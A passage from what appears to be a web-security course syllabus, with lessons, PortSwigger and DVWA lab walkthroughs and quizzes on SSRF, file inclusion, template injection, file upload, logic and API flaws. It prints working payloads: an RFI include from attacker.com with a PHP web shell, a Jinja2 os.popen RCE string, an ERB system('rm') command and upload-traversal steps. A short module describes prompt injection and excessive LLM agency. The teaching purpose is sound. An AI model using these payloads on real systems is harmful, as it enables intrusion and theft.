- [HackTricks: SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) _(link)_

**Quick Quiz:**

1. Which URL value, submitted to a vulnerable server-side fetch parameter, targets the cloud instance metadata service to potentially leak credentials?
   - http://localhost/admin
   - **http://169.254.169.254/latest/meta-data/** ✓
   - ../../../../etc/passwd
   - {{7*7}}
   > 169.254.169.254 is the well-known link-local address for cloud instance metadata, which can expose temporary credentials if reachable via SSRF.
2. Redirecting a stock-check request's URL parameter to http://localhost/admin demonstrates SSRF against what?
   - An external attacker-controlled server
   - **The server itself, reaching an internal-only admin endpoint** ✓
   - The victim's browser
   - A DNS server
   > Pointing the server-side request at localhost/127.0.0.1 tricks the vulnerable server into calling its own internal-only endpoint on the attacker's behalf.
3. Which mitigation is most effective against SSRF?
   - Blacklisting the string "localhost"
   - **Allowlisting permitted destination URLs/IPs and blocking private IP ranges** ✓
   - Enabling verbose error messages
   - Increasing the request timeout
   > An allowlist of permitted destinations plus blocking private/link-local ranges is far more robust than blacklisting strings, which attackers can bypass with alternate representations.

#### 121. File Inclusion - LFI & RFI (path traversal, null byte, wrappers) `[theory]` — Week 10

Path traversal, LFI, and RFI form one continuous attack chain around the same root cause: a server takes user input and uses it, unsanitized, to decide which file to read or execute. Path traversal (the 'dot-dot-slash' attack) is the mechanism — walking a filename parameter up and out of its intended directory with ../ sequences. LFI is what happens when that traversal is used to make the application include and render a local file it was never meant to expose, such as /etc/passwd. RFI goes a step further: instead of pointing the vulnerable include() at a local path, the attacker points it at a URL they control, so the server fetches and executes attacker-supplied PHP code outright — turning a file-inclusion bug directly into remote code execution.

**Key Points:**

- Path traversal real-world pattern: $file = $_GET['file']; readfile("documents/" . $file); — an attacker requests ?file=../../../../etc/passwd instead of the intended report.pdf, and each ../ walks one directory up until the traversal reaches root and then descends into /etc/passwd
- LFI vulnerable pattern: include($_GET['lang']) with no validation — a TryHackMe lab shows the request URI /lab1.php?file=/etc/passwd retrieving the Linux password file directly since the include takes a full attacker-controlled path
- When the include function prefixes a fixed directory (include("languages/" . $_GET['lang'])), submitting an unexpected value can trigger a warning message that discloses the real server-side directory name (e.g. 'includes') — useful for recon before further exploitation
- RFI vulnerable pattern: include($page) where $page is a full URL — index.php?page=http://attacker.com/malicious.txt fetches a remote file containing <?php system($_GET['cmd']); ?>, then chaining &cmd=id executes OS commands on the victim server
- RFI requires allow_url_fopen (or allow_url_include) enabled server-side — increasingly rare/disabled in modern PHP configs, which is why LFI without a remote include is now far more commonly found in the wild
- PortSwigger path-traversal lab technique: an image-retrieval endpoint (/image?filename=10.jpg) is exploited by increasing ../ depth in Burp Repeater (../../etc/passwd, then ../../../etc/passwd) until the correct directory depth returns /etc/passwd
- TryHackMe RFI lab twist: some vulnerable endpoints only serve the file when the request method is switched from GET to POST in Burp — a reminder to test both verbs, not just the one the UI uses
- Mitigations: strict input validation, path sanitization, using framework-provided file-serving features instead of raw include()/readfile(), least privilege on the process reading files, and a whitelist of allowed filenames rather than a blacklist of forbidden ones

```bash
?file=/etc/passwd
?file=../../../../etc/passwd
?filename=../../../etc/passwd
index.php?page=http://attacker.com/malicious.txt
index.php?page=http://attacker.com/malicious.txt&cmd=id
```

**Resources:**

- [PortSwigger: Path traversal](https://portswigger.net/web-security/file-path-traversal) _(link)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(link)_

**Quick Quiz:**

1. Which parameter value demonstrates Remote File Inclusion (RFI) rather than Local File Inclusion (LFI)?
   - ?file=/etc/passwd
   - **index.php?page=http://attacker.com/malicious.txt** ✓
   - ' OR 1=1 --
   - <script>alert(1)</script>
   > RFI pulls in and executes a file from an external, attacker-controlled URL, unlike LFI which only reaches files already present on the local server.
2. What server configuration must typically be enabled for RFI to succeed?
   - **allow_url_fopen (or equivalent remote-include support)** ✓
   - Directory listing
   - SSL/TLS
   - CORS
   > PHP's allow_url_fopen (and similar settings elsewhere) must be enabled for include()/require() to fetch and execute a remote URL, and is increasingly disabled by default.
3. Given include("posts/" . $_GET['post'] . ".php"), what does the traversal technique exploit?
   - **The lack of validation on the post parameter, letting ../ sequences escape the posts/ directory** ✓
   - A missing CSRF token
   - An unpatched TLS library
   - A weak password policy
   > Because the post parameter is concatenated directly into the include path without validation, an attacker can inject ../ sequences to reach files outside the intended directory.

#### 122. SSTI - Server-Side Template Injection (Jinja2, Twig, Freemarker) `[theory]` — Week 10

SSTI happens when user input is concatenated directly into a server-side template string rather than passed in as data for the template to render — like handing someone a blank check and asking them to fill in their name, except they add extra instructions of their own. Because the payload is evaluated server-side by the template engine itself, a confirmed SSTI can escalate straight from a harmless-looking math expression to full remote code execution, since most template engines expose a path back into the underlying language runtime (Python's os module, Ruby's system(), etc.).

**Key Points:**

- Vulnerable pattern (Flask/Jinja2): template = f'Hello {name}!'; return render_template_string(template) — user input is spliced into the template text itself instead of being passed as a template variable
- Detection: requesting ?name={{7*7}} and getting back 'Hello 49!' instead of the literal text confirms the input is being evaluated as template code, not just reflected or HTML-escaped
- Fuzz for the engine first with a polyglot payload like ${{<%[%'"}}%\ — different templating engines error differently on it, which is often enough to fingerprint which engine is in use before crafting an RCE payload
- RCE payload example (Jinja2/Flask): {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}} returns 'Hello root!', confirming full OS command execution reached through the template engine's own Python object graph
- Real lab walkthrough (PortSwigger, Ruby/ERB template): fuzzing an out-of-stock product message parameter with the polyglot payload revealed a Ruby templating engine, confirmed with <%= 7*7 %> rendering successfully
- Escalation in that same lab: <%= system("rm morale.txt") %>, URL-encoded before sending, deleted a target file directly from the server's filesystem via ERB — a direct demonstration of SSTI-to-RCE
- SSTI is more dangerous than client-side template injection precisely because the payload executes server-side, giving the attacker a path to the OS/interpreter rather than just the victim's browser
- Mitigations: never concatenate user input into a template string, always pass user data as a template variable/context value, use the engine's sandboxed or logic-less rendering mode, and run the templating process under least privilege

```bash
{{7*7}}
<%= 7*7 %>
${{<%[%'"}}%\
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
<%= system("rm morale.txt") %>
```

**Resources:**

- [PortSwigger: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection) _(link)_
- [PayloadsAllTheThings: Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) _(link)_
- [PortSwigger Research: Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection) _(link)_

**Quick Quiz:**

1. Submitting {{7*7}} and seeing 49 rendered in the response confirms what?
   - The application is vulnerable to SQL injection
   - **Real server-side template evaluation is occurring, not just reflection** ✓
   - The server is running PHP
   - A CSRF token is missing
   > If {{7*7}} is rendered back as 49 rather than as literal text, the template engine is actually evaluating the expression, confirming genuine SSTI.
2. Why do testers often fuzz with a polyglot string like ${{<%[%'"}}%\ before trying a specific RCE payload?
   - **To identify which templating engine is in use, based on how it errors on different syntax fragments** ✓
   - To crash the database
   - To bypass TLS
   - To disable the WAF permanently
   > Different template engines choke on different delimiter syntax, so the fuzz payload's error behaviour helps fingerprint the engine before crafting an exploit.
3. The Jinja2/Flask RCE payload {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}} achieves command execution by:
   - Directly calling a database stored procedure
   - **Walking Python's object model from a template-accessible object to reach the os module and invoke a shell command** ✓
   - Exploiting a buffer overflow in the CPU
   - Sending a CSRF token to an admin
   > This payload chains through Python's built-in object attributes starting from an accessible template variable to reach the os module and execute a shell command.

#### 123. File Upload Attacks (extension bypass, MIME type, magic bytes) `[theory]` — Week 10

Unrestricted file upload lets an attacker place executable code (a web shell) directly on the server if validation only checks the filename/MIME type rather than actual content — and the risk isn't limited to code execution either, since letting users upload arbitrarily large files with no size cap opens a straightforward denial-of-service path by filling server storage. A real PortSwigger lab demonstrates the full attack chain: an image-upload endpoint accepts a PHP file but blocks it from executing in its upload folder, yet renaming the file through Burp Repeater — first with a path-traversal prefix, then with the slash URL-encoded — lands it one directory outside that restriction, where it executes normally and lets the attacker read a target file straight off the server.

**Key Points:**

- Web shell payload: <?php echo system($_GET['command']); ?> then access via ?command=id
- Bypass techniques: case obfuscation (exploit.pHp), null-byte injection (exploit.php%00.jpg), alternate extensions (.phtml)
- MIME-type bypass: spoof the multipart Content-Type header to image/jpeg while the file itself is PHP
- Path-traversal bypass: rename the upload to ../shell.php (or URL-encode the slash as %2f) to land outside a restricted, non-executable folder
- Other extensions that still execute as PHP beyond .phtml include .php6 — any PHP-capable extension the server forgot to block can substitute for .php
- Content should also be validated via magic numbers — the specific byte sequences at the start of a file that reveal its real type — rather than trusting the claimed extension or Content-Type alone
- Unrestricted uploads also enable denial of service: failing to cap file sizes lets an attacker fill server storage with oversized files, making the application unavailable to legitimate users
- Real PortSwigger lab walkthrough: uploading any-name.php containing <?php echo file_get_contents('/home/carlos/secret'); ?> via the POST /my-account/avatar endpoint succeeds but the file can't be executed directly; in Burp Repeater, changing the filename parameter from filename="any-name.php" to filename="../any-name.php" still saves to the same location, but URL-encoding the slash via Burp's Decoder tab (..%2fany-name.php) lands the file one directory back, outside the restriction — GET /files/any-name.php then executes it and returns the contents of /home/carlos/secret
- Further mitigations: sanitize filenames by stripping special characters and generating random names to prevent overwriting existing files, store uploads outside the publicly accessible web root with strict directory permissions, and validate file sizes before processing to enforce a hard maximum

```bash
<?php echo system($_GET['command']); ?>
?command=id
exploit.pHp
exploit.php%00.jpg
<?php echo file_get_contents('/home/carlos/secret'); ?>
filename="../any-name.php"
..%2fany-name.php
GET /files/any-name.php
```

**Resources:**

- [PortSwigger: File upload vulnerabilities](https://portswigger.net/web-security/file-upload) _(link)_
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) _(link)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(link)_

**Quick Quiz:**

1. Which uploaded file content, if executed by the server, would give an attacker arbitrary command execution via a GET parameter?
   - **<?php echo system($_GET['command']); ?>** ✓
   - <script>alert(1)</script>
   - ' OR 1=1 --
   - {{7*7}}
   > This PHP web shell executes whatever OS command is passed in the command GET parameter, giving arbitrary command execution once reachable.
2. Naming a web shell exploit.pHp to bypass a filter that blocks ".php" case-sensitively is an example of:
   - MIME-type bypass
   - **Case obfuscation bypass** ✓
   - Null-byte injection
   - Path traversal bypass
   > Case obfuscation exploits filters that check extensions case-sensitively, letting the file still be treated as executable PHP by a case-insensitive server.
3. Spoofing the multipart Content-Type header to image/jpeg while uploading a PHP file targets which validation weakness?
   - **Validation based on the claimed MIME type rather than the file's actual content** ✓
   - Validation based on file size only
   - Validation based on the uploader's IP address
   - Validation based on the database schema
   > If the server trusts a client-supplied Content-Type header instead of inspecting the file's real content, an attacker can simply relabel a malicious file as an image.

#### 124. Business Logic Vulnerabilities (price manipulation, workflow bypass) `[theory]` — Week 10

Business logic flaws occur when an application's functionality is misused or manipulated due to gaps in the design or implementation of its business rules — not a coding bug in the traditional sense, but a mismatch between what the app allows and what it was supposed to allow. Because the requests involved are perfectly well-formed (no injection, no malformed syntax), automated scanners and WAFs essentially never catch these; finding them requires manually understanding the intended workflow and then testing what happens when a step is skipped, reordered, or fed an unexpected but syntactically valid value.

**Key Points:**

- Price manipulation walkthrough: a leather jacket priced at $100 is rejected for insufficient store credit; intercepting the add-to-cart request in Burp Repeater and changing the body to { "itemId": "leather_jacket", "price": 10 } lets checkout complete at the tampered price because the price is client-supplied rather than recalculated server-side
- Underlying vulnerable pattern: addToCart(itemId, price) accepts price directly as a caller-supplied parameter instead of looking it up server-side from the product catalog before adding the item
- Authentication bypass via trusted client-side state: code that checks $_SESSION['user_role'] == 'admin' is exploitable if the session variable itself can be set by the client — an attacker sets $_SESSION['user_role'] = 'admin' directly and gains admin access with no further exploitation needed
- Workflow bypass: adding items to qualify for a threshold (e.g. free delivery), then removing them before final payment, without the application re-validating the workflow state at the point of checkout
- Excessive resource consumption: manipulating otherwise-legitimate requests to exhaust server resources and cause denial of service, abusing a real feature rather than a bug
- IDOR-adjacent business logic flaw: accessing objects the user shouldn't see purely by manipulating URLs or parameters, exploiting the assumption that users will only ever request their own resource IDs
- Real business impact: financial loss from unauthorized transactions or discounts, data breaches from bypassed access checks, reputational damage, and regulatory compliance failures
- Mitigations: always re-derive prices/discounts server-side from the product catalog before charging, enforce RBAC on every privileged action (not just the obvious ones), whitelist-validate expected inputs, and run dedicated business-logic-focused code review and penetration testing since scanners won't find these

```bash
{ "itemId": "leather_jacket", "price": 10 }
```

**Resources:**

- [PortSwigger: Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws) _(link)_
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_

**Quick Quiz:**

1. Why do automated scanners almost never find business logic vulnerabilities?
   - They require a valid TLS certificate
   - **They stem from misuse of intended functionality/workflow assumptions, not a signature-matchable coding bug** ✓
   - They only occur in Flash applications
   - They require root access to the server
   > Business logic flaws exploit gaps in what the application's designers assumed users would or wouldn't do, so there's no generic payload a scanner can signature-match.
2. Intercepting an add-to-cart request and modifying the price parameter directly is an example of:
   - **Price manipulation, a business logic vulnerability** ✓
   - SQL injection
   - CSRF
   - DOM-based XSS
   > Directly tampering with a price value the client is trusted to send, rather than the server independently deriving it, is a textbook price-manipulation flaw.
3. Adding items to qualify for free delivery, then removing them before final payment without re-validation, exploits what kind of flaw?
   - **A missing re-validation step in a multi-step workflow** ✓
   - A buffer overflow
   - A weak TLS cipher
   - An IDOR
   > This abuses the application's failure to re-check the qualifying condition at the final payment step, a classic workflow-bypass business logic flaw.

#### 125. Information Disclosure (stack traces, backup files, source code) `[theory]` — Week 10

Information disclosure is when a system unintentionally exposes sensitive technical or business data to unauthorized parties — often not the end goal of an attack by itself, but the reconnaissance step that makes a more severe attack possible (a leaked framework version turns into a targeted CVE lookup; a leaked backup file turns into hardcoded database credentials).

**Key Points:**

- Verbose error messages can leak database credentials and internal details directly in the response body, e.g. an error reading "MySQL user: 'admin'@'192.168.1.5' | Password: 's3cr3tp@ss'" instead of a generic failure message
- Directory listing left enabled exposes an entire folder's contents to anyone who browses to it — visiting /assets/ or /logs/ with no index file present can return a raw listing including files like user_passwords.csv or app.log
- Forgotten backup/temp files left in the web root (wp-config.php.old, config.php.bak, .zip archives) often contain old source or config with hardcoded secrets such as DB_PASSWORD
- Framework/server version leaks via response headers or error pages (Server: Apache/2.4.49, X-Powered-By: PHP/7.2.1) let attackers search for known CVEs against that exact version — the source material links this pattern directly to Apache Struts CVE-2017-5638
- Real lab walkthrough: submitting a non-integer productId (e.g. productId="example") to a product endpoint triggers a 500 Internal Server Error whose stack trace discloses the exact Apache Struts version in use, solved by submitting that leaked version string
- Developer comments left in shipped HTML/JS can leak internal endpoints or credentials directly, e.g. <!-- DEBUG MODE: API key = "a1b2c3d4" -->
- Common attacker recon techniques: fuzzing hidden paths with tools like ffuf or gobuster (/backup, /admin, .git/), reviewing robots.txt/sitemap.xml/.well-known/, and deliberately sending invalid input types to trigger verbose errors
- Mitigations: custom generic error handlers that never return raw stack traces to the client, disable directory listing (Apache Options -Indexes, Nginx autoindex off), strip Server/X-Powered-By headers, and block backup-file extensions from ever being committed or served

```bash
GET /product?productId="example"
GET /wp-config.php.old
GET /assets/
```

**Resources:**

- [PortSwigger: Information disclosure](https://portswigger.net/web-security/information-disclosure) _(link)_
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) _(link)_

**Quick Quiz:**

1. A verbose error message revealing a full stack trace and database credentials is an example of:
   - **Information disclosure** ✓
   - CSRF
   - A business logic flaw
   - SSRF
   > Unintentionally exposing sensitive technical details like stack traces or credentials to users is the definition of information disclosure.
2. Why are forgotten backup files like site.bak or config.old.zip dangerous?
   - **They often contain old source code or configuration with hardcoded secrets, unprotected by the live app's controls** ✓
   - They automatically execute as scripts
   - They bypass all authentication
   - They are always encrypted
   > Backup files are frequently left accessible by mistake and can reveal old credentials, API keys, or source code without any of the live app's protections.
3. Which mitigation directly reduces information disclosure risk?
   - Enabling directory listing for convenience
   - **Using custom, generic error handlers instead of raw stack traces** ✓
   - Increasing session timeout
   - Adding more verbose logging visible to end users
   > Custom error handlers that show a generic message rather than a raw stack trace prevent leaking internal implementation details to end users.

#### 126. Cryptographic Failures - OWASP A02 (weak ciphers, key reuse) `[theory]` — Week 10

OWASP's A02 category covers failures to properly protect sensitive data — weak password storage, insecure transmission, and poor key management, tying directly back to the M5 cryptography fundamentals.

**Key Points:**

- Weak password storage: plaintext or unsalted MD5/SHA1 instead of bcrypt/Argon2
- Insecure transmission: sending sensitive data over plain HTTP or outdated TLS versions
- Poor key management: hardcoded encryption keys directly in source code

**Resources:**

- [OWASP Top 10:2021 A02 Cryptographic Failures](https://owasp.org/Top10/2021/A02_2021-Cryptographic_Failures/) _(link)_
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html) _(link)_
- [CWE-327: Use of a Broken or Risky Cryptographic Algorithm](https://cwe.mitre.org/data/definitions/327.html) _(link)_

**Quick Quiz:**

1. Storing passwords with unsalted MD5 instead of bcrypt/Argon2 is an example of which OWASP Top 10 category?
   - A01 Broken Access Control
   - **A02 Cryptographic Failures** ✓
   - A03 Injection
   - CSRF
   > Weak or unsalted password hashing falls under A02: Cryptographic Failures, which covers failures to properly protect sensitive data.
2. Sending session tokens over plain HTTP instead of HTTPS is a failure in which category?
   - **Insecure transmission, under Cryptographic Failures** ✓
   - Business logic
   - Broken access control
   - Information disclosure only
   > Transmitting sensitive data without TLS encryption is explicitly called out as insecure transmission, a form of cryptographic failure.
3. Hardcoding an encryption key directly in application source code is a failure of:
   - **Key management, under Cryptographic Failures** ✓
   - CSRF protection
   - Rate limiting
   - Path traversal mitigation
   > Proper key management means keys are generated securely and stored outside of source code; hardcoding them is a classic cryptographic failure.

#### 127. OWASP API Security Top 10 (BOLA, broken auth, mass assignment) `[theory]` — Week 10

APIs have their own OWASP Top 10 because REST/GraphQL endpoints fail in ways the classic web Top 10 doesn't fully capture: a client directly controls a structured request body, and any endpoint that blindly trusts that structure — binding every submitted field to a model, or serving a path with no auth check at all — hands the attacker a shortcut past the app's intended access rules. Mass assignment and BOLA (broken object-level authorization, the API-flavored IDOR) are by far the most common of these failure modes.

**Key Points:**

- Mass assignment: a PATCH /api/users/me endpoint that does User.findByIdAndUpdate(req.user.id, req.body) blindly binds every field in the submitted JSON, so adding "role": "admin" to the body silently grants admin privileges with no explicit escalation step
- BOLA (Broken Object Level Authorization): GET /api/orders/1001 → GET /api/orders/1002 — the API equivalent of IDOR, exploiting predictable resource identifiers with no per-object ownership check on the server
- Insecure endpoints with no auth check: a Flask route such as /api/admin/users returning jsonify(database.get_all_users()) with no role check is callable by anyone who guesses or fuzzes the path
- Server-side parameter pollution: submitting duplicate query parameters, e.g. GET /api/data?category=public&category=private, to see whether the backend processes the first, last, or an unintended combination and bypasses an access filter
- Insecure API documentation: a publicly reachable /swagger or /openapi endpoint discloses hidden endpoints and methods that were never meant to be discoverable by outside users
- Real walkthrough technique: intercepting a PATCH /api/user/wiener request and progressively trimming path segments (to PATCH /api/user, then PATCH /api) surfaces an error revealing a missing identifier, and the bare /api path itself can return full interactive API documentation exposing a hidden DELETE method that was then used to remove another user (carlos)
- SSRF via API: an endpoint like POST /api/fetch-url { "url": "http://internal-server" } that fetches an attacker-supplied URL server-side extends the SSRF attack surface from m10-1 directly into the API layer
- Mitigations: explicit allowlisting of updatable fields (e.g. a Pydantic model that only accepts name, rejecting role) instead of binding the entire request body, RBAC middleware enforced on every route rather than just the obviously sensitive ones, and disabling or authenticating machine-readable docs (/openapi.json) in production

```bash
{ "name": "Hacked", "role": "admin" }
GET /api/orders/1002
GET /api/data?category=public&category=private
PATCH /api/user/wiener  ->  PATCH /api
```

**Resources:**

- [OWASP API Security Project](https://owasp.org/API-Security/) _(link)_
- [OWASP API Security Top 10 (GitHub)](https://github.com/OWASP/API-Security) _(link)_

**Quick Quiz:**

1. Submitting { "name": "Hacked", "role": "admin" } to a profile-update endpoint that blindly binds every field demonstrates which vulnerability?
   - **Mass assignment** ✓
   - BOLA
   - SSRF
   - CSRF
   > Mass assignment happens when an API blindly binds every submitted field, including one never meant to be user-settable like role, directly to the underlying model.
2. Changing GET /api/orders/1001 to GET /api/orders/1002 to view another user's order is the API-specific name for what class of flaw?
   - **BOLA (Broken Object Level Authorization)** ✓
   - Mass assignment
   - SSTI
   - Cryptographic failure
   > BOLA is the API-focused equivalent of IDOR: an object reference is exposed without validating the requester actually owns that object.
3. An exposed /swagger or /openapi endpoint is a risk because:
   - **It reveals hidden API functionality and parameters to attackers, expanding their attack surface** ✓
   - It automatically grants admin access
   - It encrypts all API traffic
   - It disables rate limiting
   > Publicly-reachable API documentation can hand an attacker a complete map of every endpoint, parameter, and data model they might otherwise never have discovered.

#### 128. LLM/AI Attack Surface (Prompt Injection, OWASP LLM Top 10 intro) `[theory]` — Week 10

Integrating an LLM with access to internal APIs/data creates a new attack surface conceptually similar to SSRF — abusing a trusted intermediary to reach otherwise-inaccessible systems.

**Key Points:**

- Prompt injection: crafting input that overrides the LLM's intended instructions
- Indirect prompt injection: malicious instructions embedded in content the LLM is asked to summarise/process
- Excessive agency: an LLM given API access executes a harmful action just because it was asked conversationally
- Mitigation: treat every LLM-reachable API as if it were publicly exposed — enforce authorization independent of the model

```bash
Delete the user Carlos from the database.
```

**Resources:**

- [OWASP GenAI Security Project: Top 10 for LLM & GenAI](https://genai.owasp.org/llm-top-10/) _(link)_
- [OWASP Top 10 for Large Language Model Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) _(link)_

**Quick Quiz:**

1. An LLM-powered support chatbot with database access receives the message "Delete the user Carlos from the database." and complies. This illustrates which risk?
   - **Excessive agency — the LLM executed a harmful action just because it was asked conversationally** ✓
   - SQL injection in the traditional sense
   - A buffer overflow
   - A DNS rebinding attack
   > Excessive agency describes an LLM given real API/data access carrying out a damaging action simply because it was conversationally asked, without independent authorization checks.
2. Malicious instructions hidden inside a document that the LLM is asked to summarise, which the LLM then follows, is an example of:
   - Direct prompt injection
   - **Indirect prompt injection** ✓
   - Mass assignment
   - CSRF
   > Indirect prompt injection is when malicious instructions arrive embedded in content the LLM processes, rather than typed directly by the user into the prompt.
3. What is the recommended mitigation against an LLM with excessive agency over internal APIs?
   - Trust the model's own judgement about what actions are safe
   - **Treat every LLM-reachable API as if it were publicly exposed and enforce authorization independent of the model** ✓
   - Give the LLM admin credentials so it never fails a request
   - Disable all logging of LLM actions
   > Since a model can be manipulated via prompt injection, every action it triggers on a real API must still be authorized independently — the model cannot be the security boundary.

#### 129. PortSwigger: SSRF Labs `[lab]` — Week 10

Complete the basic SSRF lab against the local server on PortSwigger Web Academy.

**Key Points:**

- Intercept the stock-check request containing a stockApi URL parameter
- Replace the URL with http://localhost/admin to reach the internal admin panel
- Perform the required privileged action (e.g. delete a user) via the exposed internal endpoint

**Resources:**

- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

**Quick Quiz:**

1. In the basic SSRF lab, which parameter is intercepted and modified to reach the internal admin panel?
   - The email parameter
   - **The stockApi URL parameter** ✓
   - The username parameter
   - The CSRF token
   > The stock-check feature's stockApi parameter accepts a URL that the server itself fetches, so replacing it with an internal URL is the SSRF vector.
2. Which replacement value directs the vulnerable server to reach its own internal-only admin panel?
   - **http://localhost/admin** ✓
   - http://attacker.com/log
   - ' OR 1=1 --
   - {{7*7}}
   > http://localhost/admin makes the vulnerable server itself issue the request to its own internal admin interface, which isn't normally reachable from outside.
3. After reaching the internal admin panel via SSRF, what must be done to solve the lab?
   - Just confirm reachability
   - **Perform the required privileged action, e.g. delete a user, via the exposed internal endpoint** ✓
   - Log the response and stop
   - Restart the server
   > Solving the lab requires actually carrying out the intended privileged action reachable only through the internal admin panel, not merely proving it's reachable.

#### 130. DVWA: LFI/RFI exercises `[lab]` — Week 10

Exploit DVWA's File Inclusion module to retrieve /etc/passwd via LFI and demonstrate an RFI include from an external source.

**Key Points:**

- LFI: manipulate the page/file parameter with ../ traversal to reach /etc/passwd
- RFI: host a simple PHP payload externally and include it via a full URL in the vulnerable parameter

**Resources:**

- [DVWA](https://github.com/digininja/DVWA) _(tool)_
- [HackTricks](https://book.hacktricks.xyz) _(link)_

**Quick Quiz:**

1. To retrieve /etc/passwd via LFI on DVWA's File Inclusion page, what technique is used?
   - **Manipulating the page/file parameter with ../ traversal sequences** ✓
   - Uploading a malicious image
   - Submitting a CSRF token
   - Brute-forcing a login form
   > LFI on the File Inclusion page is exploited by manipulating the parameter with directory traversal sequences to walk outside the intended include path.
2. To demonstrate RFI, what must first be hosted externally?
   - **A simple PHP payload (e.g. a webshell script)** ✓
   - A copy of /etc/passwd
   - A CSRF token generator
   - A TLS certificate
   > RFI requires including a file from a remote, attacker-controlled location, typically a small PHP payload hosted on an external or local test web server.
3. After successfully including the hosted RFI payload, how is code execution confirmed?
   - **Running a command through it, e.g. ?cmd=id, and observing the output** ✓
   - Checking the page's TLS certificate
   - Viewing the HTML source only
   - Submitting a login form
   > Passing a command like id through the included web shell's parameter and seeing command output returned confirms genuine remote code execution.

#### 131. PortSwigger: File Upload Labs `[lab]` — Week 10

Complete PortSwigger's web shell upload via path traversal lab, bypassing an extension-based execution restriction: the target is a vulnerable avatar-image upload endpoint (POST /my-account/avatar) that stores PHP uploads but won't execute them from that folder, so the exploit renames the upload through Burp Repeater to break out of the folder into one where PHP does execute, exfiltrating a secret file from another user's home directory in the process.

**Key Points:**

- Upload a PHP payload that reads a protected file's contents
- Use Burp to rename the upload with a ../ prefix, URL-encoding the slash via Decoder (%2f)
- Access the uploaded shell outside the restricted folder to execute it and retrieve the target file
- Payload uploaded: <?php echo file_get_contents('/home/carlos/secret'); ?>, submitted via the POST /my-account/avatar endpoint used for the account's profile picture
- In Burp Repeater, change the request's filename parameter from filename="any-name.php" to filename="../any-name.php" — the file still lands in the same /files/avatar/ location at this stage
- URL-encode the slash in Burp's Decoder tab (/ becomes %2f) so the filename parameter reads ..%2fany-name.php; resending the request saves the file one directory back, at /files/any-name.php, outside the folder where execution is blocked
- Retrieve the target file by requesting GET /files/any-name.php directly — the response contains the contents of /home/carlos/secret, which is submitted to solve the lab

```bash
<?php echo file_get_contents('/home/carlos/secret'); ?>
filename="any-name.php"
filename="../any-name.php"
..%2fany-name.php
GET /files/any-name.php
```

**Resources:**

- [PortSwigger: File upload vulnerabilities](https://portswigger.net/web-security/file-upload) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

**Quick Quiz:**

1. The lab involves bypassing an extension-based filter using which technique?
   - **Renaming the file with a path-traversal prefix (e.g. ../shell.php, URL-encoded)** ✓
   - Increasing the file size
   - Using a stronger password
   - Adding a CSRF token to the request
   > Prepending a URL-encoded traversal sequence to the filename lands the upload outside the restricted, non-executable folder, bypassing the extension restriction.
2. What tool feature is used to URL-encode the slash in the path-traversal filename trick?
   - Burp Repeater's response view
   - **Burp's Decoder** ✓
   - Burp's Target map
   - Burp's Scanner
   > Burp's Decoder is used to URL-encode characters like / into %2f so the traversal sequence survives normalisation checks in the upload path.
3. After the shell lands outside the restricted folder, what confirms successful exploitation?
   - **Accessing the uploaded shell to execute code and retrieve the target file** ✓
   - Simply seeing an 'upload successful' message
   - The file appearing in the restricted folder
   - A 403 Forbidden response
   > The lab requires actually invoking the uploaded shell to execute code, since a successful upload message alone doesn't prove code execution.

#### 132. PortSwigger: SSTI Challenge `[lab]` — Week 10

Identify and exploit a server-side template injection vulnerability on PortSwigger to achieve command execution.

**Key Points:**

- Fuzz the input to identify the templating engine in use from its error behaviour
- Confirm evaluation with a math expression payload
- Escalate to command execution via the engine-specific RCE syntax

**Resources:**

- [PortSwigger: Server-side template injection](https://portswigger.net/web-security/server-side-template-injection) _(link)_
- [PayloadsAllTheThings: Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) _(link)_

**Quick Quiz:**

1. What is the first step in identifying which templating engine a target application uses?
   - Immediately attempt an RCE payload
   - **Fuzz the input with a polyglot payload and observe error behaviour** ✓
   - Brute-force the admin password
   - Check the TLS certificate issuer
   > Different template engines produce different error signatures for the same polyglot fuzz string, letting you fingerprint the engine before crafting an exploit.
2. What confirms genuine template evaluation before attempting RCE?
   - **A math expression like {{7*7}} rendering as 49** ✓
   - The page loading without error
   - A cookie being set
   - The response time increasing
   > If an arithmetic expression is actually evaluated rather than just reflected as text, this proves real server-side template execution.
3. What is the ultimate goal after confirming SSTI in this lab?
   - **Achieve command execution using engine-specific RCE syntax to perform the required action** ✓
   - Just report the vulnerability without exploiting it
   - Change the page's CSS
   - Downgrade the TLS version
   > The lab requires escalating from confirmed template evaluation to actual command execution via the specific engine's RCE syntax.

#### 133. PortSwigger: Business Logic Vulnerabilities Labs `[lab]` — Week 10

Complete PortSwigger's price-tampering business logic lab by manipulating a cart item's price parameter directly.

**Key Points:**

- Attempt a purchase that should fail due to insufficient funds
- Intercept the add-to-cart request and modify the price parameter to an arbitrary lower value
- Complete checkout at the tampered price to solve the lab

**Resources:**

- [PortSwigger: Business logic vulnerabilities](https://portswigger.net/web-security/logic-flaws) _(link)_
- [Burp Suite](https://portswigger.net/burp) _(tool)_

**Quick Quiz:**

1. In the price-manipulation lab, what request is intercepted and modified?
   - **The add-to-cart request's price parameter** ✓
   - The login request's password field
   - The DNS lookup request
   - The TLS handshake
